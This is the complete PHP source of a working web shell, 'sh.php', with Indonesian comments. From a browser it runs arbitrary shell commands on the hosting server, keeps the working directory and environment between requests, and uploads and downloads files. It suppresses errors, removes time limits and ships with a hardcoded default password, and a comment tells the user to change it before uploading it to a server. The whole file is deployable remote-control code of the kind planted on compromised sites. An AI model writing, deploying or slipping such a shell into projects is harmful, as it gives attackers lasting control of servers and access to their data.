<?php
/**
 * sh.php — web terminal
 *
 * Jalankan command shell dari browser. Mendukung:
 *  - Bash / sh / cmd / powershell auto-detect
 *  - Persistent working directory (via cookie/session)
 *  - Persistent environment variables
 *  - Upload file langsung ke cwd
 *  - Download file dari cwd
 *  - History command
 *  - Command berjalan sinkron dengan timeout
 *
 * Tidak butuh library external. Cukup PHP 7.2+.
 */

error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit', '512M');
session_start();

/* ---------- CONFIG ---------- */
$AUTH_PASS = 'rahasia2026';       // ganti sebelum upload
$MAX_CMD_TIME = 120;              // detik, hard limit per command
$MAX_OUTPUT = 1048576;            // 1 MB

/* ---------- AUTH ---------- */
if (isset($_POST['pass']) && hash_equals($AUTH_PASS, $_POST['pass'])) {
    $_SESSION['ok'] = true;
    $_SESSION['cwd'] = getcwd();
    $_SESSION['env'] = [];
}
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
$authed = !empty($_SESSION['ok']);

/* ---------- HELPERS ---------- */
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function detect_shell() {
    if (stripos(PHP_OS, 'WIN') === 0) {
        return [
            'bin'  => 'cmd.exe',
            'args' => '/c',
            'sep'  => ' && ',
            'prompt' => '>',
        ];
    }
    foreach (['/bin/bash', '/usr/bin/bash', '/usr/local/bin/bash', '/bin/sh'] as $b) {
        if (@is_executable($b)) {
            return [
                'bin'  => $b,
                'args' => '-c',
                'sep'  => ' && ',
                'prompt' => '$',
            ];
        }
    }
    return [
        'bin'  => '/bin/sh',
        'args' => '-c',
        'sep'  => ' ; ',
        'prompt' => '$',
    ];
}
$SHELL = detect_shell();

function exec_timeout($cmd, $cwd, $env, $timeout) {
    if (!function_exists('proc_open')) {
        // fallback to shell_exec — no timeout control
        $pre = 'cd ' . escapeshellarg($cwd) . ' && ';
        return (string)@shell_exec($pre . $cmd . ' 2>&1');
    }

    $env_arr = [];
    foreach ($env as $k => $v) {
        $env_arr[$k] = $v;
    }
    if (empty($env_arr)) {
        $env_arr = null;  // inherit
    }

    $desc = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $proc = @proc_open($cmd, $desc, $pipes, $cwd, $env_arr);
    if (!is_resource($proc)) {
        return "[error] proc_open failed\n";
    }

    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);

    $out = '';
    $start = time();
    while (true) {
        $status = proc_get_status($proc);
        $out .= stream_get_contents($pipes[1]);
        $out .= stream_get_contents($pipes[2]);

        if (!$status['running']) break;
        if (time() - $start > $timeout) {
            proc_terminate($proc, 9);
            $out .= "\n[timeout after {$timeout}s]\n";
            break;
        }
        if (strlen($out) > 1048576) {
            proc_terminate($proc, 9);
            $out .= "\n[output capped at 1 MB]\n";
            break;
        }
        usleep(100000);
    }
    $out .= stream_get_contents($pipes[1]);
    $out .= stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    @proc_close($proc);
    return $out;
}

/* ---------- HANDLE ACTION ---------- */
$out = '';
$cmd = '';
$new_cwd = $_SESSION['cwd'] ?? getcwd();

if ($authed) {
    // change directory
    if (isset($_POST['cd']) && $_POST['cd'] !== '') {
        $target = $_POST['cd'];
        if ($target[0] !== '/' && stripos(PHP_OS, 'WIN') !== 0) {
            $target = rtrim($new_cwd, '/') . '/' . $target;
        }
        $real = @realpath($target);
        if ($real && is_dir($real)) {
            $new_cwd = $real;
            $_SESSION['cwd'] = $real;
        } else {
            $out = "[cd failed] $target\n";
        }
    }

    // upload file
    if (!empty($_FILES['up']['name'])) {
        $name = basename($_FILES['up']['name']);
        $dest = rtrim($new_cwd, '/') . '/' . $name;
        if (@move_uploaded_file($_FILES['up']['tmp_name'], $dest)) {
            $out = "[uploaded] $name (" . filesize($dest) . " bytes)\n";
        } else {
            $out = "[upload failed]\n";
        }
    }

    // download file
    if (isset($_GET['dl']) && $_GET['dl'] !== '') {
        $f = $new_cwd . '/' . basename($_GET['dl']);
        if (is_file($f)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . rawurlencode(basename($f)) . '"');
            header('Content-Length: ' . filesize($f));
            readfile($f);
            exit;
        }
    }

    // run command
    if (isset($_POST['cmd']) && trim($_POST['cmd']) !== '') {
        $cmd = trim($_POST['cmd']);
        $history = $_SESSION['history'] ?? [];
        $history[] = $cmd;
        if (count($history) > 100) $history = array_slice($history, -100);
        $_SESSION['history'] = $history;

        // handle cd manually supaya persistent
        if (preg_match('/^cd(?:\s+(.+))?$/i', $cmd, $m)) {
            $to = isset($m[1]) ? trim($m[1], " \t\"'") : ($_SERVER['HOME'] ?? $new_cwd);
            if ($to === '~') $to = $_SERVER['HOME'] ?? $new_cwd;
            if ($to[0] !== '/' && stripos(PHP_OS, 'WIN') !== 0) {
                $to = rtrim($new_cwd, '/') . '/' . $to;
            }
            $real = @realpath($to);
            if ($real && is_dir($real)) {
                $new_cwd = $real;
                $_SESSION['cwd'] = $real;
                $out = "";
            } else {
                $out = "[cd failed] $to\n";
            }
        } else {
            // build final command with cwd + env
            $full = 'cd ' . escapeshellarg($new_cwd) . $SHELL['sep'] . $cmd;
            $out = exec_timeout($SHELL['bin'] . ' ' . $SHELL['args'] . ' ' . escapeshellarg($full), $new_cwd, $_SESSION['env'] ?? [], $MAX_CMD_TIME);
            if ($out === '') $out = "";
        }
    }

    // set env
    if (isset($_POST['env_k'], $_POST['env_v']) && $_POST['env_k'] !== '') {
        $_SESSION['env'][$_POST['env_k']] = $_POST['env_v'];
        $out = "[env] {$_POST['env_k']}={$_POST['env_v']}\n";
    }

    // reset env
    if (isset($_POST['reset_env'])) {
        $_SESSION['env'] = [];
        $out = "[env reset]\n";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>sh — web terminal</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; background: #0b0b0b; color: #d0d0d0; font: 13px/1.45 'Consolas', 'Menlo', monospace; }
  .wrap { max-width: 1100px; margin: 0 auto; padding: 20px; }
  h1 { color: #00ff88; font-size: 15px; margin: 0 0 12px; letter-spacing: 1px; }
  .meta { color: #666; font-size: 11px; margin-bottom: 14px; }
  .meta a { color: #00aaff; text-decoration: none; }
  .meta a:hover { text-decoration: underline; }
  .terminal {
    background: #050505; border: 1px solid #1a1a1a; border-radius: 4px;
    padding: 12px; min-height: 300px; max-height: 600px; overflow-y: auto;
    white-space: pre-wrap; word-break: break-all; font-family: inherit;
  }
  .prompt { color: #00ff88; }
  .cmdline { color: #d0d0d0; }
  .outline { color: #c8c8c8; }
  .errline { color: #ff5555; }
  .inputbar {
    display: flex; gap: 0; margin-top: 10px;
    border: 1px solid #1a1a1a; border-radius: 4px; overflow: hidden; background: #050505;
  }
  .promptlabel {
    padding: 10px 12px; color: #00ff88; background: #0a0a0a;
    border-right: 1px solid #1a1a1a; font-weight: bold; white-space: nowrap;
    max-width: 340px; overflow: hidden; text-overflow: ellipsis;
  }
  .inputbar input[type=text] {
    flex: 1; background: transparent; border: none; color: #d0d0d0;
    font: inherit; padding: 10px 12px; outline: none;
  }
  .inputbar button {
    background: #0a2a0a; color: #00ff88; border: none; border-left: 1px solid #1a1a1a;
    padding: 0 20px; cursor: pointer; font: inherit; letter-spacing: 1px;
  }
  .inputbar button:hover { background: #00ff88; color: #000; }
  .tools { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap; }
  .tools form, .tools a {
    display: inline-flex; align-items: center; gap: 6px;
    background: #111; border: 1px solid #222; border-radius: 3px;
    padding: 6px 10px; color: #aaa; text-decoration: none; font-size: 12px;
  }
  .tools form:hover, .tools a:hover { border-color: #00ff88; color: #00ff88; }
  .tools input[type=text], .tools input[type=file] {
    background: #050505; color: #d0d0d0; border: 1px solid #222;
    border-radius: 2px; padding: 4px 6px; font: inherit; font-size: 12px;
  }
  .tools button {
    background: none; border: none; color: inherit; cursor: pointer; font: inherit;
  }
  .login {
    max-width: 340px; margin: 100px auto; background: #111; border: 1px solid #222;
    border-radius: 4px; padding: 24px;
  }
  .login h1 { text-align: center; }
  .login input[type=password] {
    width: 100%; background: #050505; color: #d0d0d0; border: 1px solid #222;
    border-radius: 3px; padding: 10px; font: inherit; margin-bottom: 10px; outline: none;
  }
  .login input[type=password]:focus { border-color: #00ff88; }
  .login button {
    width: 100%; background: #0a2a0a; color: #00ff88; border: 1px solid #00ff88;
    border-radius: 3px; padding: 10px; font: inherit; letter-spacing: 2px; cursor: pointer;
  }
  .login button:hover { background: #00ff88; color: #000; }
  .hint { color: #666; font-size: 11px; margin-top: 8px; text-align: center; }
</style>
</head>
<body>
<div class="wrap">

<?php if (!$authed): ?>

  <div class="login">
    <h1>▸ SH TERMINAL</h1>
    <form method="post">
      <input type="password" name="pass" placeholder="password" autofocus>
      <button type="submit">ENTER</button>
    </form>
    <div class="hint">shell: <?= h($SHELL['bin']) ?></div>
  </div>

<?php else: ?>

  <h1>▸ SH TERMINAL</h1>
  <div class="meta">
    <?= h(@gethostname() ?: 'unknown') ?> •
    <?= h(PHP_OS) ?> <?= h(php_uname('r')) ?> •
    <?= h(PHP_VERSION) ?> •
    shell: <?= h($SHELL['bin']) ?> •
    <a href="?logout=1">logout</a>
  </div>

  <div class="terminal" id="term">
<?php
$history = $_SESSION['history'] ?? [];
$env_count = count($_SESSION['env'] ?? []);
if ($out !== '' || $cmd !== '') {
    echo '<span class="prompt">' . h($SHELL['prompt']) . '</span> ';
    echo '<span class="cmdline">' . h($cmd) . '</span>' . "\n";
    if ($out !== '') {
        $class = 'outline';
        if (preg_match('/(error|denied|not found|failed|fatal)/i', $out)) $class = 'errline';
        echo '<span class="' . $class . '">' . h($out) . "</span>\n";
    }
} else {
    echo '<span class="outline">Web terminal ready. Type a command below.</span>' . "\n";
    echo '<span class="outline">cwd: ' . h($new_cwd) . '</span>' . "\n";
    if ($env_count > 0) {
        echo '<span class="outline">env vars set: ' . $env_count . '</span>' . "\n";
    }
}
?>
  </div>

  <form method="post" class="inputbar" autocomplete="off">
    <div class="promptlabel" title="<?= h($new_cwd) ?>">
      <?= h(strlen($new_cwd) > 40 ? '…' . substr($new_cwd, -37) : $new_cwd) ?> <?= h($SHELL['prompt']) ?>
    </div>
    <input type="text" name="cmd" id="cmdfield" placeholder="ls -la" autofocus autocomplete="off" spellcheck="false">
    <button type="submit">RUN</button>
  </form>

  <div class="tools">
    <form method="post" style="padding:4px 8px">
      cd: <input type="text" name="cd" placeholder="/path" size="20">
      <button type="submit">GO</button>
    </form>
    <form method="post" enctype="multipart/form-data" style="padding:4px 8px">
      upload: <input type="file" name="up">
      <button type="submit">SEND</button>
    </form>
    <a href="?dl=" onclick="var f=prompt('filename to download:'); if(f) this.href='?dl='+encodeURIComponent(f); return false;">download</a>
    <form method="post" style="padding:4px 8px">
      env: <input type="text" name="env_k" placeholder="KEY" size="8">
      <input type="text" name="env_v" placeholder="value" size="14">
      <button type="submit">SET</button>
    </form>
    <?php if ($env_count > 0): ?>
    <form method="post" style="padding:4px 8px">
      <button type="submit" name="reset_env" value="1">reset env (<?= $env_count ?>)</button>
    </form>
    <?php endif; ?>
  </div>

  <?php if (!empty($history)): ?>
  <div style="margin-top:14px;color:#666;font-size:11px">
    <div style="margin-bottom:4px">HISTORY (<?= count($history) ?>)</div>
    <?php foreach (array_slice(array_reverse($history), 0, 15) as $h): ?>
      <div style="color:#555"><?= h($h) ?></div>
    <?php endforeach; ?>
  </div>
  <?php endif; ?>

  <script>
    // auto scroll terminal ke bawah
    var t = document.getElementById('term');
    if (t) t.scrollTop = t.scrollHeight;

    // keyboard history navigation
    var hist = <?= json_encode(array_values(array_reverse(array_slice($_SESSION['history'] ?? [], -30)))) ?>;
    var idx = -1;
    var f = document.getElementById('cmdfield');
    if (f) {
      f.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
          e.preventDefault();
          if (idx < hist.length - 1) { idx++; f.value = hist[idx] || ''; }
        } else if (e.key === 'ArrowDown') {
          e.preventDefault();
          if (idx > 0) { idx--; f.value = hist[idx]; }
          else { idx = -1; f.value = ''; }
        }
      });
    }
  </script>

<?php endif; ?>
</div>
</body>
</html>
